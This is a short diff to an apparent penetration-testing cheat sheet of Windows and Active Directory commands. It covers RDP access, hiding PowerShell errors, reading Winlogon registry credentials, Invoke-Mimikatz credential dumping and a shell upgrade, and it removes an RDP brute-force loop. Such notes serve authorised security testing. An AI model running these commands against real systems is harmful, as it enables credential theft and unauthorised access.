@@ -1,5 +1,3 @@
-rdate -n \<dc-ip\> ***Sync localtime with DC***
-  
 xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share ***RDP***
 
 $ErrorActionPreference= 'silentlycontinue' ***Hide Error in PowerShell***
@@ -14,8 +12,6 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -
 
 Invoke-Mimikatz -DumpCreds/-DumpCerts
 
-for i in `cat ips1.txt`;do proxychains xfreerdp /u:'<user>' /p:'<pass>' /v:$i +clipboard /dynamic-resolution /tls-seclevel:0 /timeout:80000;done ***RDP Brute***
-
-For RBCD guide use WriteDACL in bloodhound 
-
 script -qc /bin/bash /dev/null
+
+Service Ticket Combos - https://adsecurity.org/?p=2011
